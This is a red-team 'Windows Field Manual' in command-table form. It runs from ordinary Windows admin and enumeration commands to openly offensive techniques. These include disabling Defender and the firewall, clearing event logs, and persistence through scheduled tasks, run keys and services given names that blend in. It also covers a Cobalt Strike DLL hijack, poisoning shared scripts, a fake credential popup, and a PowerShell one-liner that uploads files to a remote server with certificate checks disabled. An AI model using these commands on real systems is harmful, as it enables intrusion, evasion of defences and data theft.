<img width="1005" height="530" alt="image" src="https://github.com/user-attachments/assets/fc43b06c-83fd-4e70-a09a-a14ce8cfd12f" /># WINDOWS FIELD MANUAL
### Windows Administrative Binaries
| Windows Administrative Binaries | |
|----------------------------------|--------------------------------------------------|
| `lusrmgr.msc` | Local user and group manager |
| `services.msc` | Services control panel |
| `taskmgr.exe` | Task manager |
| `secpol.msc` | Local security policy editor |
| `eventvwr.msc` | Event viewer |
| `regedit.exe` | Registry editor |
| `gpedit.msc` | Group policy editor |
| `control.exe` | Control panel |
| `ncpa.cpl` | Network connections manager |
| `devmgmt.msc` | Device manager editor |
| `diskmgmt.msc` | Disk manager editor |

---

### Windows Environment Variables
| Description | Environment Variables |
|--------------------------------------------------|----------------------------------|
| Points to Windows folder (Commonly: C:\Windows) | `%SYSTEMROOT%` |
| Points to user roaming directory Commonly (C:\Users\<USERNAME>\AppData\Roaming) | `%APPDATA%` |
| The computer hostname | `%COMPUTERNAME%` |
| Points to default OS drive (Commonly: C:\) | `%HOMEDRIVE%` |
| Points to user directory (Commonly: C:\Users\<USERNAME>) | `%HOMEPATH%` |
| When a command is run without a full path (for example: ipconfig) the OS searches all file paths contained in the PATH environmental variable for this file | `%PATH%` |
| When a command is run without an extension (for example: ipconfig) the OS searches for file matches that INCLUDE extensions from this PATHEXT list | `%PATHEXT%` |
| Points to default OS drive (Commonly: C:\) | `%SYSTEMDRIVE%` |
| Points to user temp folders (Commonly: C:\Users\<USERNAME>\AppData\Local\Temp) | `%TMP%` && `%TEMP%` |
| Points to user directories (Commonly: C:\Users\<USERNAME>) | `%USERPROFILE%` |
| Points to Windows directory (Commonly: C:\Windows) | `%WINDIR%` |
| Points to Windows directory (Commonly: C:\ProgramData Windows 10+) | `%ALLUSERSPROFILE%` |
---
### Windows Key Files & Locations
| Description | Windows Key Files & Locations |
|--------------------------------------------------|----------------------------------|
| DNS entries | `%SYSTEMROOT%\System32\drivers\etc\hosts` |
| Network settings | `%SYSTEMROOT%\System32\drivers\etc\networks` |
| User & password hashes | `%SYSTEMROOT%\System32\config\SAM` |
| Backup copy of SAM (WinXP) | `%SYSTEMROOT%\repair\SAM` |
| Backup copy of SAM | `%SYSTEMROOT%\System32\config\RegBack\SAM` |
| Application Log (WinXP) | `%WINDIR%\System32\config\AppEvent.Evt` |
| Security Log    (WinXP) | `%WINDIR%\System32\config\SecEvent.Evt` |
| Security Log | `%WINDIR%\System32\config\SECURITY` |
| Application Log | `%WINDIR%\System32\config\APPLICATION` |
| Startup Location (WinXP) | `%ALLUSERSPROFILE%\Start Menu\Programs\Startup\` |
| Startup Folder | `%USERPROFILE%\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` |
| Commonly used unattend install files | `%WINDIR%\Panther\` |
| Commonly used unattend install files | `%WINDIR%\System32\Sysprep` |
| Installed patches (WinXP) | `%WINDIR%\kb*` |
---

### Windows System Enumeration
| Description | Operating System Information |
|-------------|---------|
| Enumerate Windows version information | `ver` |
| Display hotfixes and service packs | `wmic qfe list` |
| Display whether 32 or 64 bit system | `wmic cpu get datawidth /format:list` |
| Enumerate OS architecture - The existence of Program Files (x86) means machine is 64bit | `dir /a c:\` |
| Display OS configuration, including service pack levels | `systeminfo` |
| Display drives | `fsutil fsinfo drives` |
| Display logical drives | `wmic logicaldisk get description,name` |
| Display environment variables | `set` |
| Date of last reboot - Created date of pagefile.sys is last startup | `dir /a c:\pagefile.sys` |
| Display shares | `net share` |
| Display local sessions | `net session` |
| List user mounted shares - MUST BE RUN IN THE CONTEXT OF THE USER | `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\` |

---

### Windows Process & Service Enumeration
| Description | PROCESS & SERVICE ENUMERATION |
|--------------------------------------------------|----------------------------------|
| Display services hosted in each process | `tasklist /svc` |
| Display detailed information for running processes that are not running as SYSTEM | `tasklist /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running" /V` |
| Force all instances of a process and child processes to terminate (terminate specific PID with /PID <PID>) | `taskkill /F /IM <PROCESS_NAME> /T` |
| Terminate all instances of a process | `wmic process where name="<PROCESS_NAME>" call terminate` |
| Display the executable path and PID of all running processes | `wmic process get name,executablepath,processid` |
| Display Anti-Virus products commonly registered as AntiVirusProduct (PowerShell command) | `Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop` |
| Run a file as a specific user (prompts for password) | `runas /user :<DOMAIN>\<USERNAME> "<FILE_PATH> [ARGS]"` |
| Display processes that match a certain string | `tasklist /v \| findstr "<STRING_TO_SEARCH>"` |
| Display processes (including command line arguments used to launch them) | `wmic process get processid,commandline` |
| Display services (space after state=) | `sc query state= all` |

---

### Windows Account Enumeration
| Description | WINDOWS ACCOUNT ENUMERATION |
|--------------------------------------------------|----------------------------------|
| Display current user | `echo %USERNAME%` |
| List number of times user has logged on | `wmic netlogin where (name like "%<USERNAME>%") get Name, numberoflogons"` |
| Display local Administrators | `net localgroup "Administrator"` |

---

### Windows Network info & Configuration
| Description | NETWORK INFO & CONFIGURATION |
|--------------------------------------------------|----------------------------------|
| Network interface information | `ipconfig /all` |
| Display local DNS cache | `ipconfig /displaydns` |
| Display all connections and ports with associated process ID | `netstat -ano` |
| Write netstat output to file every 3 seconds | `netstat -anop tcp 3 >> <FILE_PATH>` |
| Display only listening ports | `netstat -an \| findstr LISTENING` |
| Display routing table | `route print` |
| Display ARP table | `arp -a` |
| Attempt DNS zone transfer | `nslookup server <FQDN> set type=ANY ls -d <DOMAIN> > <FILEPATH> exit` |
| Domain SRV lookup (other options: _ldap, *kerberos, *sip) | `nslookup -type=SRV *www.* tcp.<URL>` |
| Disable firewall (*Old) | `netsh firewall set opmode disable` |
| Display saved wireless profiles | `netsh wlan show profiles` |
| Export wireless profiles to include plaintext encryption keys | `netsh wlan export profile folder=. key=clear` |
| List interface IDs/MTUs | `netsh interface ip show interfaces` |
| Set IP | `netsh interface ip set address name="<INTERFACE_NAME>" static <NEW_IP> <NEW_SUBNET_MASK> <NEW_GATEWAY>` |
| Set DNS server | `netsh interface ip set dnsservers name="<INTERFACE_NAME>" static <DNS_SERVER_IP>` |
| Set interface to use DHCP | `netsh interface ip set address name="<INTERFACE_NAME>" source=dhcp` |

---

### Windows Registry Commands & Important Keys
| Description | REGISTRY COMMANDS & IMPORTANT KEYS |
|--------------------------------------------------|----------------------------------|
| Search registry for password (Requires SYSTEM privileges) | `reg query HKLM /f password /t REG_SZ /s` |
| Save security hive to file | `reg save HKLM\Security security.hive` |
| OS information | `HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName /v InstallDate /v RegisteredOwner /v SystemRoot` |
| Time zone (offset in minutes from UTC) | `HKLM\System\CurrentControlSet\Control\TimeZonelnformation /v ActiveTimeBias` |
| Mapped network drives | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU` |
| Mounted devices | `HKLM\System\MountedDevices` |
| USB devices | `HKLM\System\CurrentControlSet\Enum\USB` |
| Audit policy enumeration (Requires SYSTEM privileges) | `HKLM\Security\Policy\PolAdTev` |
| Kernel/user services | `HKLM\SYSTEM\CurrentControlSet\Services` |
| Installed software for all users | `HKLM\Software` |
| Installed software for current user | `HKCU\Software` |
| Recent WordPad documents | `HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Wordpad\Recent File List` |
| Recent typed entries in the Run dialog box | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` |
| Typed URLs | `HKCU\Software\Microsoft\Internet Explorer\TypedURLs` |
| Last registry key accessed via regedit.exe | `HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit /v LastKey` |

---

### Windows Remote System Enumeration
| Description | REMOTE SYSTEM ENUMERATION |
|--------------------------------------------------|----------------------------------|
| Display sessions for remote system | `net session \\<IP_ADDRESS>` |
| Display logged in user on remote machine | `wmic /node: <IP_ADDRESS> computersystem get username` |
| Execute file hosted over SMB on remote system with specified credentials | `wmic /node: <IP_ADDRESS> /user:<DOMAIN>\<USERNAME> /password:<PASSWORD> process call create "\\<IP_ADDRESS>\<SHARE_FOLDER>\<FILE_PATH>"` |
| Display process listing every second for remote machine | `wmic /node: <IP_ADDRESS> process list brief /every:1` |
| Query remote registry | `reg query \\<IP_ADDRESS>\<REG_HIVE>\<REG_KEY>/v <REG_VALUE>` |
| Display process listing on remote system | `tasklist /S <IP_ADDRESS> /v` |
| Display system information for remote system | `systeminfo /S <IP_ADDRESS> /U <DOMAIN>\<USERNAME> /P <PASSWORD>` |
| Display shares of remote computer | `net view \<IP_ADDRESS> /all` |
| Connect to remote filesystem with specified user account | `net use * \\<IP_ADDRESS>\<SHARE FOLDER> /user:<DOMAIN>\<USERNAME> <PASSWORD>` |
| Add registry key to remote system | `REG ADD "\\<IP_ADDRESS>\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D "<FILE_PATH>"` |
| Copy remote folder | `xcopy /s \\<IP_ADDRESS>\<SHARE_FOLDER> <LOCAL_DIR>` |
| Display system uptime - look for creation date of pagefile.sys. This is the last time the system started | `dir \\<IP_ADDRESS>\c$` |
| Display processes (look for AV, logged on users, programs of interest, etc.) | `tasklist /v /s <IP_ADDRESS>` |
| Display system architecture - Presence of "Program Files (x86)" means 64-bit system | `dir \\<IP_ADDRESS>\c$` |

## Windows Data Mining
## FILE INFO & SEARCHING
| Description | Command |
|-------------|---------|
| Search for all PDFs | `dir /a /s /b C:\*.pdf*` |
| Search current and subdirectories for .txt files for case insensitive string "password" | `findstr /SI password *.txt` |
| Display file contents | `type <FILE_PATH>` |
| Display all lines in a file that match case insensitive <STRING> | `find /I "<STRING_TO_SEARCH>" <FILE_PATH>` |
| Display line count for a file | `type <FILE_PATH> | find /c /v ""` |
| Enumerate recently opened files | `dir C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Recent`<br><br>#Then run the following command on the .lnk:<br>`type <FILE_PATH>`<br><br>#Look for full file path in output |

## REMOTE SCHTASKS EXECUTION

*Upload binary to remote machine, create scheduled task pointing at that binary, run task, and delete task. Can change "OfficeUpdater" to any task name that blends into target system.*

| Description | Command |
|-------------|---------|
| Add task | `schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH> /s <IP_ADDRESS>` |
| Query task verbose | `schtasks /query /tn OfficeUpdater /fo list /v /s <IP_ADDRESS>` |
| Run task | `schtasks /run /tn OfficeUpdater /s <IP_ADDRESS>` |
| Delete task | `schtasks /delete /tn OfficeUpdater /f /s <IP_ADDRESS>` |

# Domain and User Enumeration

*This section details important and useful domain enumeration commands. These commands can display computers, users, groups, etc.*

## DOMAIN ENUMERATION WITH NET.EXE
*Net.exe will NOT list groups in groups. Refer to DSQuery section to enumerate groups in groups.*
| Description | Command |
|-------------|---------|
| List accounts with administrative access to the current machine | `net localgroup administrators` |
| List accounts and groups with administrative access to the domain controller | `net localgroup administrators /domain` |
| Display hosts currently visible on the network | `net view /domain` |
| Display all users in current domain | `net user /domain` |
| Display user information for domain user account (status, policy, groups, etc.) | `net user <USERNAME> /domain` |
| Display domain account policies | `net accounts /domain` |
| Display domain groups | `net group /domain` |
| Display users in a domain group | `net group "<GROUPNAME>" /domain` |
| Display domain controllers in the current domain | `net group "Domain Controllers" /domain` |
| Display all computer hostnames for current domain | `net group "Domain Computers" /domain` |
| Unlock domain user account | `net user <USERNAME> /ACTIVE:YES /domain` |
| Change domain user password | `net user <USERNAME> "<PASSWORD>" /domain` |

## DOMAIN ENUMERATION WITH DSQUERY
*All DSQuery commands must be run from a machine that has dsquery.exe on disk (commonly Windows Server) and most of the commands DO NOT require administrative privileges.*
| Description | Command |
|-------------|---------|
| Display administrative users | `dsquery * -filter "(&(objectclass=user)(admincount=1))" -attr samaccountname name` |
| Output dsquery results to disk | `dsquery * -filter "((objectclass=user))" -attr name samaccountname > <OUTPUT_PATH>` |
| Compress dsquery results | `makecab <INPUT_PATH> <OUTPUT_PATH>` |
| Extract dsquery results | `expand <INPUT_PATH> <OUTPUT_PATH>` |
| Display Active Directory OUs | `dsquery * -filter "(objectclass=organizationalUnit)" -attr name distinguishedName description -limit 0` |
| Display computers filtering on operating system | `dsquery * -filter "(operatingsystem=*10*)" -attr name operatingsystem dnshostname -limit 0` |
| Display all computers with a pattern in the hostname ('DC') | `dsquery * -filter "(name=*DC*)" -attr name operatingsystem dnshostname -limit 0` |
| Display all Active Directory objects with a pattern SMITH in the hostname. Great for finding user objects! | `dsquery * -filter "(name=*smith*)" -attr name samaccountname description -limit 0` |
| Filter on EPOCH time (password last changed, last login, etc.) 1 with 12 0's is a day in epoch (100000000000000). Add or subtract to adjust dsquery filter | `dsquery * -filter "(&(objectclass=user)(lastlogon><EPOCH_TIME>))" -attr samaccountname name` |
| Display trusts associated with current domain | `dsquery * -filter "(objectclass=trusteddomain)" -attr flatname trustdirection` |
| Display active directory objects in a remote domain (useful if trust exists) | `dsquery * -filter "(operatingsystem=*server*)" -attr name operatingsystem description dnshostname -d <DOMAIN_FQDN>` |
| Display computers with helpful attributes | `dsquery * -filter "(objectclass=computer)" -attr name dnshostname operatingsystem description -limit 0` |
| Display users with helpful attributes | `dsquery * -filter "(objectclass=user)" -attr name samaccountname lastlogon memberof description -limit 0` |
| Display groups with helpful attributes | `dsquery * -filter "(objectclass=group)" -attr name samaccountname member description -limit 0` |
| Display every Active Directory object with admin in the name | `dsquery * -filter "(name=*admin*)" -attr name samaccountname description objectclass -limit 0` |
| Convert NT epoch time (lastLogonTimestamp time format) to readable | `w32tm /ntte <EPOCH_TIME>` |

# Windows [Re]Configuration

*This section covers re-configuration of Windows which can be used to further a potential red team assessment. A few examples include enabling remote desktop protocol, adding firewall rules, or creating accounts.*

## REMOTE DESKTOP PROTOCOL (RDP) CONFIGURATION
| Description | Command |
|-------------|---------|
| Enable RDP | `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`<br><br>`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f`<br><br>`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`<br><br>`netsh advfirewall firewall set rule group="remote desktop" new enable=yes`<br><br>`sc start TermService` |
| Optional: Can execute technique remotely by interacting with remote registry | `reg add "\\<IP_ADDRESS>\HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f` |
| Change RDP Listening Port Number (Need to restart RDP Service) | `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f` |

## MISC [RE]CONFIGURATION
| Description | Command |
|-------------|---------|
| Lock workstation | `rundll32 user32.dll,LockWorkStation` |
| Disable Windows firewall | `netsh advfirewall set currentprofile state off`<br>`netsh advfirewall set allprofiles state off` |
| Native Windows port forward (* must be admin) | `netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2`<br><br>#Remove<br>`netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1` |
| Re-enable command prompt | `reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f` |
| List software names and uninstall software | `wmic product get name /value`<br>`wmic product where name="XXX" call uninstall /nointeractive` |
| Turn on IP forwarding | `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 1 /f` |
| Share a folder with full permissions to everyone | `net share sharename=<SHARE_FOLDER> /GRANT:everyone,FULL`<br>`icacls <FILE_PATH> /grant Everyone:(F) /T` |
| Add a local user and place in the local administrators group | `net user <USERNAME> <PASSWORD> /ADD`<br>`net localgroup "Administrators" <USERNAME> /ADD` |
| Uninstall a patch | `wusa /uninstall /kb:4516059 /quiet` |
| Forcibly delete all files from specified directory and all subdirectories | `del <FILE_PATH>\*.* /S /Q /F` |

## DISABLE WINDOWS DEFENDER
| Description | Command |
|-------------|---------|
| Disable service | `sc config WinDefend start= disabled` |
| Stop service | `sc stop WinDefend` |
| PowerShell command to disable real time monitoring | `Set-MpPreference -DisableRealtimeMonitoring $true` |
| PowerShell command to remove virus definitions | `"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All` |

## WINDOWS EVENT VIEWER MANIPULATION
| Description | Command |
|-------------|---------|
| Backup the Application log and then clear all events | `wevtutil cl Application /bu:<FILE_PATH>.evtx` |
| Display the 20 most recent events from the application log | `wevtutil qe Application /c:20 /rd:true /f:text` |
| Display the last 100 logon events | `wevtutil qe security /q:"*[System[(EventID=4624)]]" /c:100 /rd:true` |
| Display all logon events during the last 24 hours (PowerShell) | `$date = (Get-Date).AddHours(-24); Get-WinEvent –FilterHashtable @{ logname = "Security"; STARTTIME = $date; ID = 4624}` |
| Clear Security & Application event log (PowerShell) | `Get-EventLog –list`<br>`Clear-EventLog –LogName Application, Security` |

### Prefetch [1!]
**Prefetch Location:**
`%SYSTEMROOT%\Prefetch`
**Prefetch filename structure:**
`<APPLICATION_NAME>-<8 CHAR HASH OF LOCATION>`
**Additional meta data:**
- executable name (up to 29 chars)
- number of times the application has been executed
- volume related information
- files and directories used during application start-up

# User Level Persistence

*This section details important and useful user level persistence techniques. Since they are "user level" they do not require any administrative privileges and most of them execute on user log in.*

## SCHEDULED TASK USER PERSISTENCE

*Upload binary and add scheduled task pointing at that uploaded binary. Can change OfficeUpdater to a task name that blends into target system.*

| Description | Command |
|-------------|---------|
| Add user level task that executes at 9:00AM daily | `schtasks /Create /F /SC DAILY /ST 09:00 /TN OfficeUpdater /TR <FILE_PATH>` |
| Query task in verbose mode | `schtasks /query /tn OfficeUpdater /fo list /v` |
| Delete task | `schtasks /delete /tn OfficeUpdater /f` |

## RUN KEY USER PERSISTENCE
*Upload binary and add run key value pointing at uploaded binary. Can change OfficeUpdater to run key value that blends into target system.*
| Description | Command |
|-------------|---------|
| Add key | `reg ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V OfficeUpdater /t REG_SZ /F /D "<FILE_PATH>"` |
| Query key | `reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| Delete key | `reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V OfficeUpdater` |

## STARTUP DIRECTORIES

*Upload binary to a specific "startup" folder. All files in this folder are executed on user login.*

| Description | Directory |
|-------------|-----------|
| Windows NT 6.1, 6.0, Windows 10, Windows 11 | `%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` |
| All users: | `%SystemDrive%\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` |
| Specific users: | `%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup` |
| Windows NT 5.2, 5.1, 5.0 | `%SystemDrive%\wmlOWS\Start Menu\Programs\Startup` |
| Windows 9x | `%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup` |
| Windows NT 4.0, 3.51, 3.50 | |

## AT.EXE SCHEDULE (WINXP)

| Description | Command |
|-------------|---------|
| Schedule task | `at HH:MM <FILE_PATH> [ARGS]` |
| Delete task | `at <TASK_ID> /delete` |

## POISONING EXISTING SCRIPTS
*Enumerate all user persistence methods discussed in this section looking for existing persistence that has been created via script files such as .bat, .ps1, etc. If those are modifiable by a basic user, modify them to launch a malicious uploaded payload. Just beware, if the script is on a file server it could be executed by many users.*

# System Level Persistence

*This section details important and useful SYSTEM level persistence techniques. Since they are "SYSTEM" they will require administrative privileges and most of them execute during system startup.*

## SCHTASKS ON BOOT

*Upload binary to system folder and create scheduled task pointing at that binary for execution. Can change OfficeUpdater to a different task name that blends into target system.*

| Description | Command |
|-------------|---------|
| Add task | `schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH>` |
| Query task in verbose mode | `schtasks /query /tn OfficeUpdater /fo list /v` |
| Delete task | `schtasks /delete /tn OfficeUpdater /f` |
| Run Task Manually | `schtasks /run /tn OfficeUpdater` |
| Optional: Can call schtasks to import a task as XML | `schtasks /create /tn OfficeUpdater /xml <FILE_PATH>.xml /f` |

## SERVICE CREATION

*Upload binary to folder and create service pointing at that binary. Can change the service description and display name to blend into the target system.*

| Description | Command |
|-------------|---------|
| Add service (Change displayname to a name that blends in with your executable) | `sc create <SERVICE_NAME> binpath= "<FILE_PATH>" start= auto displayname= "Windows Update Proxy Service"` |
| Assign description to service (Change description to a phrase that blends in with your service information) | `sc description <SERVICE_NAME> "This service ensures Windows Update works correctly in proxy environments"` |
| Query Service config | `sc qc <SERVICE_NAME>` |
| Query service status | `sc query <SERVICE_NAME>` |
| Query service description | `sc qdescription <SERVICE_NAME>` |
| Delete service | `sc delete <SERVICE_NAME>` |
| OPTIONAL: Can execute sc.exe commands remotely by referencing the remote system after sc.exe | `sc \\<IP_ADDRESS> qc <SERVICE_NAME>` |

## WINDOWS 10 .DLL HIJACK (WPTSEXTENSIONS)

*Upload malicious.dll named WptsExtensions.dll (works with default Cobalt Strike .dll) anywhere in system path, reboot machine, and the schedule service will load the malicious WptsExtensions.dll*

| Description | Command |
|-------------|---------|
| List folders in PATH | `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH` |
| Upload malicious.dll named 'WptsExtensions.dll' to folder in PATH | Upload malicious.dll named 'WptsExtensions.dll' to folder in PATH |
| Reboot target computer (schedule service will load WptsExtensions.dll on startup) | Reboot target computer (schedule service will load WptsExtensions.dll on startup) |
| Remove uploaded WptsExtensions.dll to remove persistence | Remove uploaded WptsExtensions.dll to remove persistence |

*Note: Many .dll hijacks exist on Windows systems and a simple Google search should list all the vulnerable filenames, services, and even contain examples of how to execute a given .dll hijack technique on a system.*

# Windows Scripting

*This section details various PowerShell and Batch script examples. Some of these examples enumerate system information, cause system effects, or aid with the discovery of sensitive information.*

## PowerShell Scripting

### POWERSHELL BASICS
| Description | Command |
|-------------|---------|
| Stops recording | `Stop-Transcript` |
| Displays file contents | `Get-Content <FILE_PATH>` |
| Shows examples of <command> | `Get-Help <COMMAND> -Examples` |
| Searches for command string | `Get-Command '*<STRING_TO_SEARCH>*'` |
| Displays services (stop-service, start-service) | `Get-Service` |
| Displays services, but takes alternate credentials | `Get-WmiObject -Class win32_service` |
| Display PowerShell version | `$psVersionTable` |
| Run PowerShell 2.0 from 5.0 | `powershell -version 2.0` |
| Returns # of services | `Get-Service | measure-object` |
| Displays drives in the current session | `get-psdrive` |
| Returns only process names | `Get-Process | select -expandproperty name` |
| Cmdlets that take creds | `get-help * -parameter credential` |
| Available WMI network commands | `get-wmiobject -list *network` |
| DNS Lookup | `[Net.DNS]::GetHostEntry("<IP_ADDRESS>")` |

## POWERSHELL ONELINERS
| Description | Command |
|-------------|---------|
| Launch file with PowerShell | `powershell -ep bypass -nop -File <FILE_PATH>` |
| TCP port connection (scanner) (Change <PORT>'s to match desired ports to scan, and replace IP) | `$ports=(<PORT>,<PORT>,<PORT>);$ip="<IP_ADDRESS>";foreach ($port in $ports){try{$socket=New-object System.Net.Sockets.TcpClient($ip,$port);catch{} if($socket -eq $NULL){echo $ip":"$port" - Closed"}else{echo $ip":"$port" - Open";$socket = $NULL}}` |
| Ping with 500 millisecond timeout | `$ping = New-Object System.Net.NetworkInformation.ping;$ping.Send("<IP_ADDRESS>",500)` |
| Basic authentication popup | `powershell –WindowStyle Hidden –ExecutionPolicy Bypass $Host.UI.PromptForCredential("<WINDOW_TITLE>","<MESSAGE>","<USERNAME>","<DOMAIN>")` |
| Run FILE every 4 hours between Aug 8-11, 2022 and the hours of 0800-1700 (from Cmd.exe) | `powershell –Command "do {if ((Get-Date –format YYYYMMDD-HHMM) -match '202208(0[8-9]\|1[0-1])\|(0[8-9]\|1[0-7])[0-5][0-9]') {Start-Process –WindowStyle Hidden "<FILE_PATH>";Start-Sleep –s 14400}}while(1)"` |
| PowerShell runas | `$password = convertto-securestring -string "<PASSWORD>" –asplaintext –force; $pp = new-object –typename System.Management.Automation.PSCredential –argumentlist "<DOMAIN>\<USERNAME>", $pw; Start-Process powershell –Credential $pp –ArgumentList '-noprofile –command &{Start-Process <FILE_PATH> -verb runas}'` |
| Email sender | `Send-MailMessage -to "<EMAIL>" –from "<EMAIL>" –subject "<SUBJECT>" –a "<FILE_ATTACHMENT>" –body "<BODY>" –SmtpServer "<IP_ADDRESS>" -Port "<PORT>" -Credential "<PS_CRED_OBJECT>" -UseSsl` |
| PowerShell file download from specified URL | `powershell –noprofile –noninteractive –Command 'Invoke-WebRequest -Uri "https://<URL>" -OutFile <FILE_PATH>'` |
| PowerShell data exfil | Script will send a file ($filepath) via http to server ($server) via POST request. Must have web server listening on port designated in the $server<br><br>`powershell –noprofile –noninteractive –command '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server="*https://<URL>*"; $filepath="***<FILE_PATH>***"; $http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);'` |
| Export OS info into CSV file | `Get-WmiObject –class win32_operatingsystem | select –property * | export-csv <FILE_PATH>` |
| List running services | `Get-Service | where {$_.status –eq "Running"}` |
| PowerShell Netstat Equivalent | `[System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpConnections()` |
| Persistent PSDrive to remote file share | `New-PSDrive -Persist -PSProvider FileSystem -Root \\<IP_ADDRESS>\<SHARE_FOLDER> -Name I` |
| Return files with write date past 8/20 | `Get-ChildItem -Path <FILE_PATH> -Force -Recurse -Filter *.log -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2012-08-20"}` |
| Turn on PowerShell remoting | `PowerShell -Command 'Enable-PSRemoting -Force'` |

## WINDOWS PRIVILEGE ESCALATION CHECKLIST
- Enumerate all File Servers in a domain and net view to find open shares. Once all shares are located, enumerate all share files/folders for sensitive data such as: administrative info, credentials, user home directories, etc. Repeat against other systems in the domain (other server roles like database, web, etc.) which may have misconfigured network shares exposing sensitive data.
- Enumerate PATH and then .DLL hijack (wlbsctrl or scheduler) if applicable.
- Run open-source tool "SharpUp" to enumerate potential privilege escalation opportunities such as vulnerable paths, weak service information, and more.
- Enumerate startup folder, user scheduled tasks, etc. Attempt to poison global shared scripts set to run at login.
- Gain access to administrative shares and attempt to poison scripts run by administrators or macro enabled files.

## FILE SYSTEM REDIRECTION
*File System Redirection - > Jump to x64 process from x86*
| Description | Command |
|-------------|---------|
| Execute x64 binary: C:\Windows\Sysnative\upnpcont.exe | Execute x64 binary: `C:\Windows\Sysnative\upnpcont.exe` |
| Use tasklist to list processes and find the PID of the process that was launched | `tasklist /v | findstr upnpcont` |
| Inject into PID discovered in previous step | Inject into PID discovered in previous step |
| Exit original x86 process | Exit original x86 process |









